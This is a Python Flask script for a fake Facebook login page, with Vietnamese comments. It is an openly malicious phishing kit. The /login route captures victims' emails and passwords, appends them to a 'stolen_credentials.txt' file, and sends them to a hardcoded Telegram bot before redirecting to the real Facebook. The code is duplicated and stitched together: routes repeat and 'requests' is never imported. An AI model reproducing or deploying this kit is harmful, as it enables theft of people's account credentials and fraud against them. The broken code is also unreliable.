from flask import Flask, render_template, request, redirect, make_response
import os
from datetime import datetime

app = Flask(__name__)

# ================== TELEGRAM CONFIG ==================
TELEGRAM_TOKEN = "8627470730:AAFrgL2duCraRYWn9NoFySOVw2Z66xYrR2Q"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(email, password):
    message = f"""
🔴 **THÔNG TIN MỚI ĐÃ THU THẬP**

📧 Email: {email}
🔑 Password: {password}
⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🌐 Source: Facebook Fake
    """
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        print(f"✅ Đã gửi Telegram: {email}")
    except:
        print("❌ Lỗi gửi Telegram")

# ====================================================

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    
    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
    
    send_to_telegram(email, password)
    
    resp = make_response(redirect('https://www.facebook.com'))
    resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
    return resp

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    
    # Lưu thông tin đăng nhập (để demo)
    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
    
    print(f"🔴 ĐÃ THU THẬP: {email} | {password}")
    
    # Set cookie giả lập session
    resp = make_response(redirect('https://www.facebook.com'))
    resp.set_cookie('c_user', 'fake_user_1234567890', max_age=3600*24)
    resp.set_cookie('xs', 'fake_session_token_abcdef123456', httponly=True, max_age=3600*24)
    resp.set_cookie('session_id', 'hijackable_session_' + os.urandom(8).hex(), httponly=True)
    
    return resp

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)